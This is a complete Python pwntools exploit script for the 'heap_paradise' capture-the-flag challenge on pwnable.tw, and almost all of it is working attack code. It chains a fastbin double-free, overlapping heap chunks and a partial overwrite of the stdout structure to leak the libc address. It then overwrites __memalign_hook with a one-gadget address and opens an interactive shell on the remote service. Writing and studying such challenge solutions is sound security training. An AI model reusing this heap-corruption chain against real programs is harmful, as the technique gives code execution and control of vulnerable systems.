import sys
from pwn import *

if len(sys.argv) != 2:
	print "sys.argv[1] = r : remote	l : local"
	exit()

#context.log_level = 'debug'

def allocate(Size, Data):
	p.sendafter('You Choice:', '1')

	p.sendafter('Size :', str(Size))
	p.sendafter('Data :', str(Data))

def free(Index):
	p.sendafter('You Choice:', '2')

	p.sendafter('Index :', str(Index))

def exit():
	p.sendafter('You Choice:', '3')


if sys.argv[1].strip() == 'l':
	p = process('./heap_paradise')
elif sys.argv[1].strip() == 'r':
	p = remote('chall.pwnable.tw', 10308)

e = ELF('./heap_paradise')

if sys.argv[1].strip() == 'l':
	l = e.libc
elif sys.argv[1].strip() == 'r':
	l = ELF('./heap_paradise.so.6')

#pause()
allocate(0x40, 'a') #0
allocate(0x40, 'a') #1
allocate(0x20, p64(0) + p64(0x51)) #2
allocate(0x60, 'a' * 0x20 + p64(0) + p64(0xb1)) #3
allocate(0x60, 'a' * 0x10 + p64(0) + p64(0x51)) #4


free(0)
free(1)
free(0)

free(3)

allocate(0x40, chr(0xb0)) #5

allocate(0x40, 'a') #6
allocate(0x40, 'a') #7
allocate(0x40, 'a' * 0x10 + p64(0) + p64(0x91)) #8

free(3)
free(8)

#pause()
allocate(0x40, 'a' * 0x10 + p64(0) + p64(0x71) + chr(0xdd) + chr(0x15)) #9

allocate(0x60, 'a')# 10


try:
	fake = p64(0xfbad1800)
	fake += p64(0) * 3 + '\x00'
	allocate(0x60, 'a' * 0x33 + fake) # 11
except Exception as e:
	os.execl('/usr/bin/python', 'heap_paradise.py', *sys.argv) # 12

p.recvuntil('\x7f')
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 131 - l.sym['_IO_2_1_stdout_']
log.info('libc : ' + hex(libc))

free(3)
free(8)

allocate(0x40, 'a' * 0x10 + p64(0) + p64(0x71) + p64(libc + l.sym['__memalign_hook'] - 0x13)) # 13
allocate(0x60, 'a') #14
allocate(0x60, 'a' * (0x13)+ p64(libc + 0xf0567))

p.sendafter('You Choice:', '1')

p.sendafter('Size :', str(0))

p.interactive()